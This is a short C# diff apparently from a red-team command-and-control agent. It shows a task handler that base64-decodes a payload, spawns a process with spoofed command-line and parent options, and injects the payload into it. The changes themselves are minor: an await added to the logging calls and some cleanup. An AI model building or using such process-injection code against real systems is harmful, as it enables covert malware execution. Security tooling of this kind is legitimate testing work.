@@ -1,7 +1,7 @@
 ﻿using Agent.Interfaces;
-using System.Text.Json;
 using Agent.Models;
 using Agent.Utilities;
+using System.Text.Json;
 
 namespace Agent
 {
@@ -37,23 +37,21 @@ namespace Agent
             //Create new process
             byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
 
-            //ProcessSpawner spawner = new ProcessSpawner(job.task.id, args.commandline, args.spoofedcommandline, args.parent, args.output);
-
             if (await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
             {
                 if(spawner.TryGetHandle(job.task.id, out var handle))
                 {
                     technique.Inject(buf, handle.DangerousGetHandle());
-                    messageManager.WriteLine("Injected", job.task.id, true);
+                    await messageManager.WriteLine("Injected", job.task.id, true);
                     return;
                 }
 
-                messageManager.WriteLine("Failed to get handle", job.task.id, true);
+                await messageManager.WriteLine("Failed to get handle", job.task.id, true);
                 return;
 
             }
 
-            messageManager.WriteLine("Process spawn failed.", job.task.id, true);
+            await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
         }
     }
 }
